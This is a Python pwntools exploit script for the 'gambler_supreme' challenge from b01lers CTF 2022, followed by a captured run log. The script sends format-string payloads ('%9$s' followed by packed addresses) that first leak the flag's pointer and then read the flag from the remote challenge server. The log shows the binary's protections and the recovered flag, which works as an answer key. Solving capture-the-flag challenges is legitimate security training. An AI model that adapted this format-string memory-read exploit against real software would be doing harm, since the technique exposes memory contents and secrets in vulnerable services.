from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './gambler_supreme'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "ctf.b01lers.com"
  PORT = 9201
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.23.so'})
  #libc = elf.libc

s.sendlineafter(": ", "7")

buf = "%9$s----"+p64(elf.sym.flag)
s.sendlineafter("letters: ", buf)
s.recvuntil("Your guess: ")
addr = s.recvuntil("-")[:-1]
flag_addr = u64(addr.ljust(8, "\x00"))

print "flag_addr =", hex(flag_addr)

buf = "%9$s----"+p64(flag_addr)
s.sendlineafter("letters: ", buf)

s.interactive()

'''
mito@ubuntu:~/CTF/b01lers_CTF_2022/Pwn_gambler_supreme$ python solve.py r
[*] '/home/mito/CTF/b01lers_CTF_2022/Pwn_gambler_supreme/gambler_supreme'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to ctf.b01lers.com on port 9201: Done
flag_addr = 0x20db490
[*] Switching to interactive mode
Your guess: bctf{1_w4nn4_b3_th3_pr0_g4mb13r}
'''
